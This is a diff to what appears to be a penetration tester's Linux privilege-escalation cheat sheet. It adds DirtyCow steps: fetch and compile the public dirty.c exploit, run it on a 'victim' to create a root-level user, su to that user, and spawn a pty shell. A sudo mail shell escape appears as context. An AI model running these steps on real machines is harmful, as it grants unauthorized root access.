@@ -53,3 +53,28 @@ sudo mail --exec='!/bin/bash'
 ```
 
 ## Crontab - Privesc
+
+## DirtyCow
+
+https://dirtycow.ninja/
+https://github.com/FireFart/dirtycow/blob/master/dirty.c
+
+
+```
+➤ 1. Upload the exploit on the victim
+
+➤ 2. Compile the exploit
+gcc -pthread dirty.c -O dirty -lcrypt
+chmod +x dirty
+
+➤ 3. exploit it
+./dirty
+Please enter the new password: lexiswashere
+
+➤ Privesc
+su firefart
+Password: lexiswashere
+
+Note: if the 'su : must be run from a terminal' error appear, upgrade tty 
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
